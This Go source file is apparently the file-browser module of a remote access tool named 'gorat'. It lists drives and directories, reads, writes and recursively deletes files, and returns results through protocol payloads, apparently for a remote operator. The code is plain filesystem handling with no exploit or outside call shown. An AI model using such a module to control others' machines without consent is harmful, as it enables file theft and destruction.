package filebrowser

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"

	"gorat/pkg/protocol"
)

// Browser handles file browsing operations.
type Browser struct{}

// New creates a new Browser.
func New() *Browser {
	return &Browser{}
}

// Drives returns a list of available drives (Windows-specific).
func (b *Browser) Drives() *protocol.DriveListPayload {
	result := &protocol.DriveListPayload{Drives: []protocol.DriveInfo{}}

	if runtime.GOOS != "windows" {
		result.Error = "Drive listing only available on Windows"
		return result
	}

	result.Drives = getDrivesWindows()
	return result
}

// Browse lists files in a directory.
func (b *Browser) Browse(payload *protocol.BrowseFilesPayload) *protocol.FileListPayload {
	result := &protocol.FileListPayload{Path: payload.Path, Files: []protocol.FileInfo{}}

	entries, err := ioutil.ReadDir(payload.Path)
	if err != nil {
		result.Error = err.Error()
		return result
	}

	for _, entry := range entries {
		fullPath := filepath.Join(payload.Path, entry.Name())
		fileInfo := protocol.FileInfo{
			Name:    entry.Name(),
			Path:    fullPath,
			Size:    entry.Size(),
			Mode:    entry.Mode().String(),
			ModTime: entry.ModTime(),
			IsDir:   entry.IsDir(),
		}
		result.Files = append(result.Files, fileInfo)

		if payload.Recursive && entry.IsDir() {
			subPayload := &protocol.BrowseFilesPayload{Path: fullPath, Recursive: true}
			subResult := b.Browse(subPayload)
			result.Files = append(result.Files, subResult.Files...)
		}
	}

	return result
}

// ReadFile reads a file and returns its content.
func (b *Browser) ReadFile(path string) *protocol.FileDataPayload {
	result := &protocol.FileDataPayload{Path: path}

	data, err := ioutil.ReadFile(path)
	if err != nil {
		result.Error = err.Error()
		return result
	}

	result.Data = data
	result.Checksum = protocol.CalculateChecksum(data)
	return result
}

// WriteFile writes content to a file.
func (b *Browser) WriteFile(payload *protocol.FileDataPayload) error {
	dir := filepath.Dir(payload.Path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}
	return ioutil.WriteFile(payload.Path, payload.Data, 0644)
}

// DeleteFile deletes a file or directory.
func (b *Browser) DeleteFile(path string) error {
	return os.RemoveAll(path)
}

// FileInfo returns file metadata.
func (b *Browser) FileInfo(path string) (*protocol.FileInfo, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	absPath, _ := filepath.Abs(path)
	return &protocol.FileInfo{
		Name:    info.Name(),
		Path:    absPath,
		Size:    info.Size(),
		Mode:    info.Mode().String(),
		ModTime: info.ModTime(),
		IsDir:   info.IsDir(),
	}, nil
}
